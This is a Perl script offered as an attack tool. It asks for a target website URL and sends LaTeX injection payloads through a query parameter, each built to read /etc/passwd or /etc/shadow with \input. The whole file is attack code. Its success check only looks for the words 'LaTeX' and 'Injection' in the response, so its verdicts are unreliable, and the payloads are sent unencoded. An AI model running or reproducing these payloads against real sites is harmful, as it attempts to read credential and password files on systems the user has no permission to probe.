#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use Term::ANSIColor;

# Function to send GET request
sub send_request {
    my $url = shift;
    my $ua  = LWP::UserAgent->new;
    my $res = $ua->get($url);
    return $res->content if $res->is_success;
    return;
}

# Function to check for vulnerability and sensitive information
sub check_vulnerability {
    my $url       = shift;
    my @payloads  = (
        '\documentclass{article}\begin{document}\input{../etc/passwd}\end{document}',
        '\documentclass{article}\begin{document}\input{../etc/shadow}\end{document}',
        '\documentclass{article}\begin{document}\input{/etc/passwd}\end{document}',
        '\documentclass{article}\begin{document}\input{/etc/shadow}\end{document}',
        # Add more payloads here
    );

    print "Testing for LaTeX Injection vulnerability on $url...\n";
    print "Please wait...\n";

    my $vulnerable = 0;
    my $response   = '';

    foreach my $payload (@payloads) {
        print "Trying payload: $payload\n";
        my $injection_url = $url . "?payload=" . $payload;
        my $response      = send_request($injection_url);

        if ($response && $response =~ /LaTeX/ && $response =~ /Injection/) {
            $vulnerable = 1;
            print color('bold red'), "The target website is vulnerable to LaTeX Injection!\n", color('reset');
            print color('bold blue'), "Successfully executed payload: $payload\n", color('reset');
            # Highlight sensitive information in the response
            $response =~ s/(\/etc\/passwd|\/etc\/shadow)/\e[1;31m$1\e[0m/g; # Highlight sensitive paths
            print "Response content:\n$response\n";
            last; # Stop checking other payloads if one is successful
        }
    }

    unless ($vulnerable) {
        print color('bold green'), "The target website is not vulnerable to LaTeX Injection.\n", color('reset');
    }
}

# Main program
sub main {
    print color('bold green'), "Enter your target website URL: ", color('reset');
    my $target_url = <STDIN>;
    chomp $target_url;

    check_vulnerability($target_url);
}

main();
